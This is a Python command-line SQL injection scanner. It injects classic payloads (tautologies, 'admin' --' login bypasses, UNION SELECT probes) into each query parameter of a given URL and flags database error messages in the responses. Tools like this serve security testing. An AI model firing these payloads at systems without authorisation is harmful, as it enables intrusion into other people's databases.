#!/usr/bin/env python3
"""
SQL Injection Scanner
=====================
Detects SQL injection vulnerabilities
"""

import requests
import urllib.parse
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

class SQLiScanner:
    def __init__(self, url):
        self.url = url
        self.payloads = [
            "'", "1' OR '1'='1", "1' OR '1'='1' --", "1' OR '1'='1' /*",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "admin' --",
            "admin' #", "admin'/*", "' or 1=1 limit 1 --", "1' UNION SELECT NULL--",
            "1' AND '1'='2", "1' UNION SELECT 1,2,3--"
        ]
        self.error_patterns = [
            "sql syntax", "mysql_fetch", "warning: mysql", "unclosed quotation",
            "odbc", "ora-01", "pg_query", "sqlite_", "microsoft sql",
            "syntax error", "unexpected end", "unterminated string"
        ]
        
    def test_payload(self, payload):
        """Test single payload"""
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        
        vulnerable = False
        for param in params:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            try:
                response = requests.get(test_url, timeout=10)
                response_text = response.text.lower()
                
                for pattern in self.error_patterns:
                    if pattern in response_text:
                        print(f"{Fore.RED}[!] VULNERABLE: {param} with payload: {payload}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}    Pattern found: {pattern}{Style.RESET_ALL}")
                        vulnerable = True
                        break
            except:
                pass
        
        return vulnerable
    
    def scan(self):
        """Run scan"""
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}SQL Injection Scanner{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Target: {self.url}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}\n")
        
        found = False
        for payload in self.payloads:
            if self.test_payload(payload):
                found = True
        
        if not found:
            print(f"\n{Fore.GREEN}[+] No SQL injection found{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[!] SQL injection detected!{Style.RESET_ALL}")
        
        return found

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL with parameters')
    
    args = parser.parse_args()
    
    scanner = SQLiScanner(args.url)
    scanner.scan()

if __name__ == "__main__":
    main()
